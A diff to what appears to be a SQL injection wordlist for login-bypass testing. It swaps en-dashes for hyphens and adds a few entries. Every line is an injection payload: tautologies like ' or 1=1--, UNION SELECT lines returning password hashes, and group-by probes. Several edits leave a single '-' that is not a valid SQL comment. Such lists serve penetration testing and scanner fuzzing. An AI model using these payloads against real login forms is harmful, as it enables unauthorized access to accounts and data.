@@ -47,10 +47,14 @@ admin' -- AND password='123'
 admin' union select * from users where '1
 ';' AND password='123'
 ad'||'min';' AND password='123'
+`ad'||'min';`
+`ad'||'min';`
+`admin';`
 ' or '1'='1
 ' or ''='
 ' or 1]%00
 ' or /* or '
+*/
 ' or "a" or '
 ' or 1 or '
 ' or true() or '
@@ -156,7 +160,7 @@ admin") or "1"="1"/*
 '
 ' --
 ' #
-' –
+' -
 '--
 '/*
 '#
@@ -168,31 +172,31 @@ admin") or "1"="1"/*
 or true
 ' or ''='
 " or ""="
-1′) and '1′='1–
+1′) and '1′='1-
 ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 and 1=1
-and 1=1–
+and 1=1--
 ' and 'one'='one
-' and 'one'='one–
+' and 'one'='one-
 ' group by password having 1=1--
 ' group by userid having 1=1--
 ' group by username having 1=1--
 like '%'
 or 0=0 --
 or 0=0 #
-or 0=0 –
+or 0=0 -
 ' or         0=0 #
 ' or 0=0 --
 ' or 0=0 #
-' or 0=0 –
+' or 0=0 -
 " or 0=0 --
 " or 0=0 #
-" or 0=0 –
+" or 0=0 -
 %' or '0'='0
-or 1=1–
+or 1=1-
 ' or 1=1--
 ' or '1'='1
 ' or '1'='1'--
@@ -201,11 +205,11 @@ or 1=1–
 ' or '1′='1
 ' or 1=1
 ' or 1=1 --
-' or 1=1 –
+' or 1=1 -
 ' or 1=1;#
 ' or 1=1/*
 ' or 1=1#
-' or 1=1–
+' or 1=1-
 ') or '1'='1
 ') or '1'='1--
 ') or '1'='1'--
@@ -224,11 +228,11 @@ or 1=1–
 " or "1"="1"#
 " or 1=1
 " or 1=1 --
-" or 1=1 –
+" or 1=1 -
 " or 1=1--
 " or 1=1/*
 " or 1=1#
-" or 1=1–
+" or 1=1-
 ") or "1"="1
 ") or "1"="1"--
 ") or "1"="1"/*
@@ -237,18 +241,18 @@ or 1=1–
 ") or ("1"="1"--
 ") or ("1"="1"/*
 ") or ("1"="1"#
-) or '1′='1–
-) or ('1′='1–
+) or '1′='1-
+) or ('1′='1-
 ' or 1=1 LIMIT 1;#
 'or 1=1 or ''='
 "or 1=1 or ""="
 ' or a=a--
-' or a=a–
+' or a=a-
 " or "a"="a
 ") or ("a"="a
 ') or ('a'='a and hi") or ("a"="a
 ' or 'one'='one
-' or 'one'='one–
+' or 'one'='one-
 ' or uid like '%
 ' or uname like '%
 ' or userid like '%
